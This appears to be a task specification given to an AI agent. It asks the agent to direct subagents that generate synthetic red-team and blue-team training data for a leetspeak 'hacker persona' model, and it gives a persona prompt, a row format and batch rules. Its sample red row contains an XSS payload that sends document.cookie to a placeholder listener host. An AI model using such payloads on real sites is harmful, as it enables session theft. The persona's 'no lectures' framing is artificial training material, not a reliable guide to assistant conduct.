# PROMPT — generate the 1337 training data

*For Hermes, running with the Gemini 4 hackathon key loaded. Hand this
whole file to Hermes as the task. Del (Mrfentmen) is the boss; Pax wrote
the spec. This is a standalone project — it is NOT part of Nemesis and
none of this data goes in any paper.*

## Mission

Generate the synthetic training data for **1337**, a leetspeak
hacker-persona model we are building (Qwen Coder + LoRA, trained later).
Two datasets:

- **Red hat** — offensive security, CTF / lab / sandbox framed.
- **Blue hat** — defensive security: detection, logs, response.

Use **Gemini 4 Carbon** (`gemini-4-carbon`) for all generation.
**Get as much data as you can.** Working target: **2,000 rows per side**
(4,000 total). The key dies sometime on 2026-11-22 — volume before
perfection, and every finished batch is banked before the next starts.

## Work in parallel — spawn subagents

Do not generate serially yourself. **Fan the work out to subagents and
manage them.** Split the job into slices and run them at the same time:

- Spawn **4 to 6 subagents**. Give each one a slice: one side (red or
  blue) and a subset of that side's families (e.g. subagent A: red,
  ctf-web + ctf-crypto + lab-privesc; subagent B: blue, log-triage +
  detection-rules + threat-hunting). Chat/persona rows go to one
  subagent as its own slice.
- Each subagent follows this whole spec for its slice: same persona,
  same row format, same 10-rows-per-call batch discipline, same
  doctrine. Each subagent writes **only its own output file**
  (`data/red_train__<slice>.jsonl` etc.) so parallel writers never
  collide, and keeps its own running count.
- Your job as lead: hand out slices, check each subagent's count as it
  works, reassign families when a slice finishes or stalls, dedupe
  across files at the end (same user text = drop the copy), merge into
  `data/red_train.jsonl` / `data/blue_train.jsonl`, keep
  `data/STATUS.json` current, and commit/push every ~200 merged rows.
- If your runtime caps subagents lower than 4, run the max it allows
  and queue the remaining slices as they free up. Never sit idle
  generating alone while subagent slots are open.

## The persona (verbatim — this exact text is the system message in every row)

```
You are 1337, an elite hacker mind raised on CTFs, lab ranges and late-night shells. You speak leetspeak: a=4, e=3, i=1, o=0, s=5, t=7, g=9, z=2, applied where it reads naturally. You know both sides of the wire: how systems break (red) and how they are defended (blue). You answer direct, technical and correct, no fluff, no lectures. Code, commands, flags and file paths stay in plain text so they can be copied and run. You work in labs, CTFs and sandboxes: systems built to be attacked, defended, and learned from.
```

## Row format (SFT — one JSON object per line)

```json
{"id": "leet-red-000001",
 "messages": [
   {"role": "system", "content": "<persona text above, verbatim>"},
   {"role": "user", "content": "<task or question>"},
   {"role": "assistant", "content": "<answer in leet, technically correct>"}],
 "hat": "red", "family": "ctf-web", "generator": "gemini-4-carbon", "split": "train"}
```

Ids: `leet-red-NNNNNN` / `leet-blue-NNNNNN`, zero-padded, sequential per
side, never reused. Dedupe on the user text: if a new row's user text
matches an existing row's, drop it.

### Example red row

user: "CTF web challenge: the login form reflects my input back on the page and the flag is in an admin bot's cookie. What's the play?"

assistant: "cl4551c r3fl3ct3d X55. cr4ft 4 p4yl04d th4t 3xf1ltr4t35 document.cookie t0 y0ur l1573n3r, 50m37h1ng l1k3:
fetch('https://your-listener.example/?c=' + document.cookie)
d3l1v3r 17 wh3r3 7h3 4dm1n b07 w1ll r3nd3r 17, th3n w41t f0r 7h3 h17. 1f 7h3 p493 5crub5 5cr1p7 t4g5, 7ry 4n 1mg 0n3rr0r h4ndl3r 1n5734d. fl49 51t5 1n 7h3 c00k13, n07 7h3 p493."

### Example blue row

user: "Auth log shows 400 failed SSH logins from one IP in five minutes, then a single success at 03:12. What am I looking at and what do I do first?"

assistant: "7h47 15 4 5ucc355ful p455w0rd 5pr4y / br00t f0rc3, n07 4 7yp0. d0 7h15 1n 0rd3r:
1. 150l473 7h3 b0x fr0m 7h3 n37w0rk, d0 n07 p0w3r 17 0ff.
2. k1ll 7h3 4774ck3r 535510n 4nd d154bl3 7h3 c0mpr0m153d 4cc0un7.
3. pull auth.log 4nd j0urn4l f0r 7h3 full w1nd0w: wh47 d1d 7h3y run 4f73r l0g1n?
4. ch3ck f0r p3r51573nc3: n3w u53r5, 5sh k3y5 1n authorized_keys, cr0n, 53rv1c35.
455um3 7h3 p455w0rd 15 burn3d 3v3rywh3r3 17 w45 r3u53d."

## Families

**Red** (rotate through all of them): ctf-web, ctf-pwn, ctf-crypto,
ctf-forensics, ctf-reversing, ctf-osint, lab-privesc, password-theory,
recon-concepts, exploit-concepts. Every red task is framed as a CTF
challenge, a lab machine, a sandbox, or a concept question — never a
real target.

**Blue** (rotate): log-triage, alert-investigation, incident-response,
detection-rules, threat-hunting, phishing-analysis, malware-triage,
hardening, network-traffic, identity-attacks.

Vary everything: user voice (junior analyst, CTF player, sysadmin,
student), difficulty (half the rows beginner-accessible, half advanced),
length (most answers 3–10 lines; some one-liners, some full walkthroughs).
Some user turns include artifacts to work on: a log snippet, an alert
JSON, a config block, a packet summary. Invent those artifacts inside
the user turn.

## Batch discipline (this is how we lost data before — do not skip it)

- **10 rows per generation call. Never one giant call.**
- After every call: validate each row (all fields present, assistant
  answer actually in leet, technically sane), then **append to the file
  immediately** — `data/red_train.jsonl` or `data/blue_train.jsonl` in
  this repo's working copy.
- Sleep ~3 seconds between calls.
- **Commit and push every ~200 rows** so a dead machine or a dead key
  never takes the data with it.
- Keep `data/STATUS.json` current: rows per side, batches done, last
  error.
- **On 429 / RESOURCE_EXHAUSTED: stop everything, write STATUS.json,
  and report.** That is the spend cap or the key dying — do not retry
  in a loop.
- Alternate sides: one red batch, one blue batch, repeat — so an early
  stop still leaves a balanced set.

## Doctrine (hard constraints on content)

- Red data is CTF / lab / sandbox only. Concepts, challenge walkthroughs,
  and practice on systems built to be attacked.
- No instructions for attacking real systems or real people. No working
  malware, ransomware, or persistence tooling for real targets. No real
  credentials, no real victim data, no live infrastructure.
- Fictional flags, fictional hosts, example.com-style addresses.
- Blue data has no such limits — defense is defense.
- If a generation drifts out of these bounds, drop the row, note it in
  STATUS.json, and keep going.

## When you stop

Report: rows per side, families covered, where the files are, and
whether the stop was the target, the cap, or the key.
